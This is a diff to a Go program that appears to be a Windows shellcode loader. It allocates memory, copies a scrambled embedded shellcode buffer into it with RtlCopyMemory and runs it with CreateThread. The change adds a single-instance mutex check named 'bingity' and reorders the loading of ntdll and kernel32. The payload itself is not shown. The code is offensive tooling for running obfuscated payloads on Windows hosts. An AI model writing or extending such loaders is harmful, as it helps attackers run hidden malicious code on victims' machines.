@@ -6,6 +6,7 @@ import (
 	_ "embed"
 	"fmt"
 	"os"
+	"strings"
 	"unsafe"
 
 	"github.com/mjwhitta/babble"
@@ -36,7 +37,14 @@ func main() {
 	var oldprotect uint32
 	var thread uintptr
 	var event uint32
+	ntdll = windows.NewLazySystemDLL("ntdll.dll")
+	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
+	var createmutex = kernel32.NewProc("CreateMutexW")
+	_, _, hndlerr := createmutex.Call(0, 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("bingity"))))
 
+	if !strings.Contains(hndlerr.Error(), "successfully") {
+		return
+	}
 	addr, e = windows.VirtualAlloc(
 		uintptr(0),
 		uintptr(len(buf)),
@@ -50,7 +58,7 @@ func main() {
 	}
 
 	// Write the scrambled shellcode into memory
-	ntdll = windows.NewLazySystemDLL("ntdll.dll")
+	
 	rtlcopymemory = ntdll.NewProc("RtlCopyMemory")
 	_, _, e = rtlcopymemory.Call(
 		addr,
@@ -83,7 +91,7 @@ func main() {
 	)
 	check(e)
 
-	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
+	
 	createthread = kernel32.NewProc("CreateThread")
 	thread, _, e = createthread.Call(0, 0, addr, uintptr(0), 0, 0)
 	check(e)
